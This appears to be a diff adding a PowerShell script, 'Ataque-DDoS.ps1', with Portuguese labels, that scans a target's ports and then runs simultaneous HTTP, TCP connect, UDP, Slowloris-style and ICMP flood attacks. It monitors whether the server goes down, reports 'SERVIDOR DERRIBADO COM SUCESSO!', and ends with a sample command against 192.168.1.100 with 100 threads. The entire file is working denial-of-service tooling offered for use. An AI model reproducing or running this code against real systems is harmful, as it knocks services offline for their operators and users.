@@ -1,0 +1,448 @@
+# Ataque-DDoS.ps1
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$AlvoIP,
+    [string]$PortaInicial = "80",
+    [string]$PortaFinal = "443",
+    [int]$Threads = 50,
+    [int]$Duracao = 60
+)
+
+# Configurações de cores
+$CorSucesso = "Green"
+$CorAviso = "Yellow" 
+$CorErro = "Red"
+$CorInfo = "Cyan"
+$CorAtaque = "Magenta"
+$CorDetalhe = "Gray"
+
+function Escrever-Cor {
+    param([string]$Mensagem, [string]$Cor = "White")
+    Write-Host $Mensagem -ForegroundColor $Cor
+}
+
+function Testar-Servidor {
+    param([string]$IP, [string]$Porta)
+    
+    try {
+        $TesteTCP = New-Object System.Net.Sockets.TcpClient
+        $Resultado = $TesteTCP.BeginConnect($IP, $Porta, $null, $null)
+        $Sucesso = $Resultado.AsyncWaitHandle.WaitOne(1000, $false)
+        
+        if ($Sucesso) {
+            $TesteTCP.EndConnect($Resultado)
+            $TesteTCP.Close()
+            return $true
+        }
+        return $false
+    }
+    catch {
+        return $false
+    }
+}
+
+function Escanear-Portas {
+    param([string]$IP, [int]$Inicio, [int]$Fim)
+    
+    Escrever-Cor "Escaneando portas do servidor $IP..." $CorInfo
+    $PortasAbertas = @()
+    
+    for ($porta = $Inicio; $porta -le $Fim; $porta++) {
+        if (Testar-Servidor -IP $IP -Porta $porta) {
+            Escrever-Cor "  Porta $porta ABERTA" $CorSucesso
+            $PortasAbertas += $porta
+        }
+    }
+    
+    return $PortasAbertas
+}
+
+function Obter-InfoServidor {
+    param([string]$IP)
+    
+    Escrever-Cor "Coletando informacoes do servidor $IP..." $CorInfo
+    
+    # Tentar identificar servico HTTP
+    try {
+        $WebRequest = [System.Net.WebRequest]::Create("http://$IP")
+        $WebRequest.Timeout = 3000
+        $Resposta = $WebRequest.GetResponse()
+        $Servidor = $Resposta.Headers["Server"]
+        $Resposta.Close()
+        
+        if ($Servidor) {
+            Escrever-Cor "  Servidor Web: $Servidor" $CorSucesso
+        }
+    }
+    catch {
+        # Ignorar erros
+    }
+    
+    # Tentar identificar outros servicos
+    $PortasComuns = @(21, 22, 23, 25, 53, 80, 110, 443, 3389, 8080, 8443)
+    
+    foreach ($porta in $PortasComuns) {
+        if (Testar-Servidor -IP $IP -Porta $porta) {
+            $Servico = switch ($porta) {
+                21 { "FTP" }
+                22 { "SSH" }
+                23 { "Telnet" }
+                25 { "SMTP" }
+                53 { "DNS" }
+                80 { "HTTP" }
+                110 { "POP3" }
+                443 { "HTTPS" }
+                3389 { "RDP" }
+                8080 { "HTTP-Alt" }
+                8443 { "HTTPS-Alt" }
+                default { "Desconhecido" }
+            }
+            Escrever-Cor "  Servico $Servico na porta $porta" $CorInfo
+        }
+    }
+}
+
+function Ataque-HTTP-Flood {
+    param([string]$IP, [int]$Threads, [int]$Duracao)
+    
+    Escrever-Cor "Iniciando HTTP Flood contra $IP..." $CorAtaque
+    $ScriptAtaque = {
+        param($Alvo, $TempoAtaque)
+        
+        $FimAtaque = (Get-Date).AddSeconds($TempoAtaque)
+        $Contador = 0
+        
+        while ((Get-Date) -lt $FimAtaque) {
+            try {
+                $WebClient = New-Object System.Net.WebClient
+                $WebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+                $WebClient.DownloadString("http://$Alvo/") | Out-Null
+                $Contador++
+            }
+            catch {
+                # Continuar mesmo com erros
+            }
+        }
+        return $Contador
+    }
+    
+    $Trabalhos = @()
+    for ($i = 1; $i -le $Threads; $i++) {
+        Escrever-Cor "  Iniciando thread $i" $CorDetalhe
+        $Trabalho = Start-Job -ScriptBlock $ScriptAtaque -ArgumentList $IP, $Duracao
+        $Trabalhos += $Trabalho
+    }
+    
+    return $Trabalhos
+}
+
+function Ataque-TCP-SYN {
+    param([string]$IP, [string]$Porta, [int]$Threads, [int]$Duracao)
+    
+    Escrever-Cor "Iniciando TCP SYN Flood na porta $Porta..." $CorAtaque
+    $ScriptAtaque = {
+        param($Alvo, $PortaAlvo, $TempoAtaque)
+        
+        $FimAtaque = (Get-Date).AddSeconds($TempoAtaque)
+        $Contador = 0
+        
+        while ((Get-Date) -lt $FimAtaque) {
+            try {
+                $Socket = New-Object System.Net.Sockets.TcpClient
+                $Socket.BeginConnect($Alvo, $PortaAlvo, $null, $null) | Out-Null
+                $Contador++
+            }
+            catch {
+                # Continuar mesmo com erros
+            }
+        }
+        return $Contador
+    }
+    
+    $Trabalhos = @()
+    for ($i = 1; $i -le $Threads; $i++) {
+        Escrever-Cor "  Iniciando SYN flood thread $i" $CorDetalhe
+        $Trabalho = Start-Job -ScriptBlock $ScriptAtaque -ArgumentList $IP, $Porta, $Duracao
+        $Trabalhos += $Trabalho
+    }
+    
+    return $Trabalhos
+}
+
+function Ataque-UDP-Flood {
+    param([string]$IP, [int]$Porta, [int]$Threads, [int]$Duracao)
+    
+    Escrever-Cor "Iniciando UDP Flood na porta $Porta..." $CorAtaque
+    $ScriptAtaque = {
+        param($Alvo, $PortaAlvo, $TempoAtaque)
+        
+        $FimAtaque = (Get-Date).AddSeconds($TempoAtaque)
+        $Contador = 0
+        $DadosAleatorios = [System.Text.Encoding]::ASCII.GetBytes("X" * 1024)
+        
+        while ((Get-Date) -lt $FimAtaque) {
+            try {
+                $UDPClient = New-Object System.Net.Sockets.UdpClient
+                $UDPClient.Connect($Alvo, $PortaAlvo)
+                $UDPClient.Send($DadosAleatorios, $DadosAleatorios.Length) | Out-Null
+                $UDPClient.Close()
+                $Contador++
+            }
+            catch {
+                # Continuar mesmo com erros
+            }
+        }
+        return $Contador
+    }
+    
+    $Trabalhos = @()
+    for ($i = 1; $i -le $Threads; $i++) {
+        Escrever-Cor "  Iniciando UDP flood thread $i" $CorDetalhe
+        $Trabalho = Start-Job -ScriptBlock $ScriptAtaque -ArgumentList $IP, $Porta, $Duracao
+        $Trabalhos += $Trabalho
+    }
+    
+    return $Trabalhos
+}
+
+function Ataque-Slowloris {
+    param([string]$IP, [int]$Threads, [int]$Duracao)
+    
+    Escrever-Cor "Iniciando Slowloris Attack..." $CorAtaque
+    $ScriptAtaque = {
+        param($Alvo, $TempoAtaque)
+        
+        $FimAtaque = (Get-Date).AddSeconds($TempoAtaque)
+        $Conexoes = @()
+        
+        while ((Get-Date) -lt $FimAtaque) {
+            try {
+                $WebRequest = [System.Net.WebRequest]::Create("http://$Alvo/")
+                $WebRequest.Timeout = 30000
+                $Conexao = $WebRequest.GetResponse()
+                $Conexoes += $Conexao
+                
+                # Manter conexoes abertas
+                if ($Conexoes.Count -gt 50) {
+                    $Conexoes[0].Close()
+                    $Conexoes = $Conexoes[1..($Conexoes.Count-1)]
+                }
+            }
+            catch {
+                # Continuar mesmo com erros
+            }
+            Start-Sleep -Milliseconds 100
+        }
+        
+        # Fechar todas as conexoes
+        foreach ($conn in $Conexoes) {
+            try { $conn.Close() } catch { }
+        }
+        
+        return $Conexoes.Count
+    }
+    
+    $Trabalhos = @()
+    for ($i = 1; $i -le $Threads; $i++) {
+        Escrever-Cor "  Iniciando Slowloris thread $i" $CorDetalhe
+        $Trabalho = Start-Job -ScriptBlock $ScriptAtaque -ArgumentList $IP, $Duracao
+        $Trabalhos += $Trabalho
+    }
+    
+    return $Trabalhos
+}
+
+function Ataque-Ping-Flood {
+    param([string]$IP, [int]$Threads, [int]$Duracao)
+    
+    Escrever-Cor "Iniciando Ping Flood (ICMP)..." $CorAtaque
+    $ScriptAtaque = {
+        param($Alvo, $TempoAtaque)
+        
+        $FimAtaque = (Get-Date).AddSeconds($TempoAtaque)
+        $Contador = 0
+        
+        $Ping = New-Object System.Net.NetworkInformation.Ping
+        
+        while ((Get-Date) -lt $FimAtaque) {
+            try {
+                $Ping.Send($Alvo, 1000) | Out-Null
+                $Contador++
+            }
+            catch {
+                # Continuar mesmo com erros
+            }
+        }
+        return $Contador
+    }
+    
+    $Trabalhos = @()
+    for ($i = 1; $i -le $Threads; $i++) {
+        Escrever-Cor "  Iniciando Ping flood thread $i" $CorDetalhe
+        $Trabalho = Start-Job -ScriptBlock $ScriptAtaque -ArgumentList $IP, $Duracao
+        $Trabalhos += $Trabalho
+    }
+    
+    return $Trabalhos
+}
+
+function Monitorar-Ataque {
+    param([array]$TodosTrabalhos, [int]$Duracao)
+    
+    Escrever-Cor "Monitorando andamento do ataque..." $CorInfo
+    $Inicio = Get-Date
+    $Fim = $Inicio.AddSeconds($Duracao)
+    
+    while ((Get-Date) -lt $Fim) {
+        $TempoRestante = ($Fim - (Get-Date)).TotalSeconds
+        $TrabalhosAtivos = ($TodosTrabalhos | Where-Object { $_.State -eq "Running" }).Count
+        
+        Escrever-Cor "  Tempo restante: $([math]::Round($TempoRestante))s - Threads ativas: $TrabalhosAtivos" $CorDetalhe
+        
+        # Testar se servidor ainda responde
+        try {
+            $Teste = Test-Connection -ComputerName $AlvoIP -Count 1 -Quiet -ErrorAction SilentlyContinue
+            if (-not $Teste) {
+                Escrever-Cor "  SERVIDOR PAROU DE RESPONDER!" $CorSucesso
+            } else {
+                Escrever-Cor "  Servidor ainda respondendo..." $CorAviso
+            }
+        }
+        catch {
+            Escrever-Cor "  Servidor possivelmente offline" $CorSucesso
+        }
+        
+        Start-Sleep -Seconds 5
+    }
+}
+
+function Finalizar-Ataque {
+    param([array]$TodosTrabalhos)
+    
+    Escrever-Cor "Finalizando ataque e coletando resultados..." $CorInfo
+    
+    $TotalRequisicoes = 0
+    $Resultados = @()
+    
+    foreach ($Trabalho in $TodosTrabalhos) {
+        if ($Trabalho.State -eq "Running") {
+            Stop-Job -Job $Trabalho
+        }
+        
+        $Resultado = Receive-Job -Job $Trabalho -ErrorAction SilentlyContinue
+        if ($Resultado) {
+            $TotalRequisicoes += $Resultado
+            $Resultados += $Resultado
+        }
+        
+        Remove-Job -Job $Trabalho
+    }
+    
+    Escrever-Cor "RELATORIO FINAL DO ATAQUE" $CorInfo
+    Escrever-Cor "=========================" $CorInfo
+    Escrever-Cor "Alvo: $AlvoIP" $CorInfo
+    Escrever-Cor "Duracao: $Duracao segundos" $CorInfo
+    Escrever-Cor "Threads utilizadas: $($TodosTrabalhos.Count)" $CorInfo
+    Escrever-Cor "Total de requisicoes enviadas: $TotalRequisicoes" $CorInfo
+    
+    # Testar servidor apos ataque
+    Escrever-Cor "Verificando estado do servidor..." $CorInfo
+    try {
+        $ServidorOnline = Testar-Servidor -IP $AlvoIP -Porta 80
+        if ($ServidorOnline) {
+            Escrever-Cor "RESULTADO: Servidor ainda online (pode ser necessario mais tempo/poder)" $CorAviso
+        } else {
+            Escrever-Cor "RESULTADO: SERVIDOR DERRIBADO COM SUCESSO!" $CorSucesso
+        }
+    }
+    catch {
+        Escrever-Cor "RESULTADO: Servidor inacessivel - possivelmente offline" $CorSucesso
+    }
+}
+
+# EXECUCAO PRINCIPAL
+Clear-Host
+Escrever-Cor "SCANNER E ATAQUE DDoS AVANCADO" $CorInfo
+Escrever-Cor "==================================" $CorInfo
+Escrever-Cor "Alvo: $AlvoIP" $CorInfo
+Escrever-Cor "Portas: $PortaInicial a $PortaFinal" $CorInfo
+Escrever-Cor "Threads: $Threads" $CorInfo
+Escrever-Cor "Duracao: $Duracao segundos" $CorInfo
+Escrever-Cor "Inicio: $(Get-Date)" $CorInfo
+Escrever-Cor "==================================" $CorInfo
+
+# Verificar se alvo esta online
+Escrever-Cor "Verificando se o alvo esta online..." $CorInfo
+if (-not (Testar-Servidor -IP $AlvoIP -Porta 80)) {
+    Escrever-Cor "AVISO: Alvo pode estar offline ou protegido" $CorAviso
+}
+
+# Fase 1: Reconhecimento
+Escrever-Cor "`nFASE 1: RECONHECIMENTO" $CorInfo
+$PortasAbertas = Escanear-Portas -IP $AlvoIP -Inicio $PortaInicial -Fim $PortaFinal
+Obter-InfoServidor -IP $AlvoIP
+
+if ($PortasAbertas.Count -eq 0) {
+    Escrever-Cor "Nenhuma porta aberta encontrada - usando portas padrao" $CorAviso
+    $PortasAbertas = @(80, 443, 8080, 8443)
+}
+
+# Fase 2: Ataques Multiplos
+Escrever-Cor "`nFASE 2: INICIANDO ATAQUES MULTIPLOS" $CorAtaque
+
+$TodosAtaques = @()
+
+# HTTP Flood nas portas web
+foreach ($porta in @(80, 443, 8080, 8443)) {
+    if ($PortasAbertas -contains $porta -or $porta -eq 80) {
+        $AtaqueHTTP = Ataque-HTTP-Flood -IP $AlvoIP -Threads 10 -Duracao $Duracao
+        $TodosAtaques += $AtaqueHTTP
+    }
+}
+
+# TCP SYN Flood nas portas abertas
+foreach ($porta in $PortasAbertas) {
+    if ($porta -lt 10000) {  # Evitar portas muito altas
+        $AtaqueSYN = Ataque-TCP-SYN -IP $AlvoIP -Porta $porta -Threads 5 -Duracao $Duracao
+        $TodosAtaques += $AtaqueSYN
+    }
+}
+
+# UDP Flood em portas comuns
+foreach ($porta in @(53, 123, 161, 1900, 5353)) {
+    $AtaqueUDP = Ataque-UDP-Flood -IP $AlvoIP -Porta $porta -Threads 3 -Duracao $Duracao
+    $TodosAtaques += $AtaqueUDP
+}
+
+# Slowloris se for servidor web
+if ($PortasAbertas -contains 80 -or $PortasAbertas -contains 443) {
+    $AtaqueSlowloris = Ataque-Slowloris -IP $AlvoIP -Threads 5 -Duracao $Duracao
+    $TodosAtaques += $AtaqueSlowloris
+}
+
+# Ping Flood
+$AtaquePing = Ataque-Ping-Flood -IP $AlvoIP -Threads 5 -Duracao $Duracao
+$TodosAtaques += $AtaquePing
+
+# Achatar array de todos os trabalhos
+$TodosTrabalhos = @()
+foreach ($ataque in $TodosAtaques) {
+    if ($ataque -is [array]) {
+        $TodosTrabalhos += $ataque
+    } else {
+        $TodosTrabalhos += $ataque
+    }
+}
+
+Escrever-Cor "Total de threads de ataque iniciadas: $($TodosTrabalhos.Count)" $CorSucesso
+
+# Fase 3: Monitoramento
+Monitorar-Ataque -TodosTrabalhos $TodosTrabalhos -Duracao $Duracao
+
+# Fase 4: Finalizacao
+Finalizar-Ataque -TodosTrabalhos $TodosTrabalhos
+
+Escrever-Cor "`nAtaque concluido as $(Get-Date)" $CorInfo
+
+
+.\Ataque-DDoS.ps1 -AlvoIP "192.168.1.100" -Threads 100 -Duracao 120
